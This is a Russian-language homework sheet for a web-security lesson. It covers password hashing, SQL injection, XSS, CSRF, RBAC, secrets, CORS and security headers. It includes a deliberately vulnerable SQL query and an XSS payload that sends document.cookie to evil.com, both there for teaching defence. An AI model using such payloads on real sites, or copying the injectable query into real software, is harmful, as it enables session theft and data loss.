# Практическое задание
## Занятие 11: Безопасность веб-приложения

---

### Задание 1: Хеширование паролей

**Реализуйте безопасное хранение паролей:**

**Функции:**
1. `hash_password(password)` - хеширование с bcrypt
2. `verify_password(password, hashed)` - проверка пароля
3. Сравните с хешированием в открытом виде
4. Измерьте время хеширования

**Требования:**
- Использовать bcrypt
- Использовать соль (bcrypt делает это автоматически)
- Обработать исключения

---

### Задание 2: SQL Injection

**Создайте уязвимый и защищённый варианты:**

**Уязвимый:**
```python
def search_user(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    cursor.execute(query)
```

**Защищённый:**
```python
def search_user(email):
    cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

**Задания:**
1. Продемонстрируйте атаку на уязвимый вариант
2. Покажите обход авторизации
3. Покажите удаление данных
4. Защитите с параметризованными запросами

---

### Задание 3: XSS защита

**Создайте уязвимую страницу:**

```html
<div>{{ comment }}</div>
```

**Атака:**
```html
<script>alert('XSS')</script>
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

**Защита:**
1. Экранирование вывода (html.escape)
2. Content Security Policy
3. HttpOnly cookie
4. Валидация ввода

---

### Задание 4: CSRF защита

**Реализуйте CSRF защиту:**

**Функции:**
1. `generate_csrf_token()` - генерация токена
2. `validate_csrf_token(token)` - проверка токена
3. Настройка SameSite cookie
4. Проверка Origin/Referer

**Задания:**
1. Создайте форму с CSRF token
2. Проверьте токен при отправке
3. Настройте SameSite=Strict
4. Протестируйте атаку

---

### Задание 5: RBAC реализация

**Реализуйте Role-Based Access Control:**

**Модели:**
```python
class User:
    id: int
    username: str
    roles: List[str]
    permissions: List[str]
```

**Роли и разрешения:**
- Admin: все разрешения
- Editor: posts.read, posts.write
- User: posts.read
- Guest: posts.read (только публичные)

**Функции:**
1. `has_permission(user, permission)` - проверка разрешения
2. `require_permission(permission)` - декоратор
3. Проверка владения ресурсом

---

### Задание 6: Проверка владения ресурсом

**Реализуйте проверку владения:**

```python
def get_post(post_id, current_user):
    post = get_post_from_db(post_id)
    
    # Проверка владения
    if post.author_id != current_user.id and not current_user.is_admin:
        raise PermissionError("Access denied")
    
    return post
```

**Задания:**
1. Реализуйте для разных ресурсов (посты, комментарии)
2. Проверьте подмену ID в запросе
3. Добавьте логирование попыток несанкционированного доступа

---

### Задание 7: Секреты и переменные окружения

**Перенесите секреты в переменные окружения:**

**.env файл:**
```bash
DATABASE_URL=postgresql://...
SECRET_KEY=secret-key
API_KEY=api-key
```

**Код:**
```python
import os
from dotenv import load_dotenv

load_dotenv()

DATABASE_URL = os.getenv('DATABASE_URL')
SECRET_KEY = os.getenv('SECRET_KEY')
```

**Задания:**
1. Создайте .env файл
2. Добавьте в .gitignore
3. Создайте .env.example
4. Загрузите переменные в коде

---

### Задание 8: CORS настройка

**Настройте CORS для API:**

```python
from flask_cors import CORS

CORS(app, resources={
    r"/api/*": {
        "origins": ["https://example.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})
```

**Задания:**
1. Настройте разрешённые источники
2. Настройте разрешённые методы
3. Настройте разрешённые заголовки
4. Протестируйте с curl

---

### Задание 9: Безопасные заголовки

**Добавьте защитные заголовки:**

```python
@app.after_request
def add_security_headers(response):
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'no-referrer-when-downgrade'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

**Задания:**
1. Добавьте все защитные заголовки
2. Настройте CSP
3. Проверьте заголовки через curl
4. Протестируйте XSS с CSP

---

### Задание 10: Практическая реализация

**Создайте защищённое API:**

**Endpoints:**
- POST /register - регистрация с хешированием пароля
- POST /login - вход с проверкой пароля
- GET /posts - список постов (только авторизованные)
- POST /posts - создание поста (только авторизованные)
- PUT /posts/{id} - обновление (только автор или admin)
- DELETE /posts/{id} - удаление (только автор или admin)

**Требования:**
- Хеширование паролей (bcrypt)
- JWT авторизация
- RBAC (admin, user)
- Проверка владения ресурсом
- CSRF защита
- Защитные заголовки
- CORS настройка

---

### Критерии оценки

- **Отлично (5):** Все задания выполнены, все механизмы безопасности реализованы, есть подробные комментарии
- **Хорошо (4):** Основные задания выполнены, базовая защита реализована
- **Удовлетворительно (3):** Хеширование паролей и базовая авторизация работают
- **Неудовлетворительно (2):** Задание не выполнено или не работает

---

### Сдача работы

1. Создайте Git-репозиторий с кодом
2. Добавьте .env.example (без реальных секретов)
3. Добавьте README с описанием мер безопасности
4. Пришлите ссылку на репозиторий

---

### Дедлайн

Следующее занятие
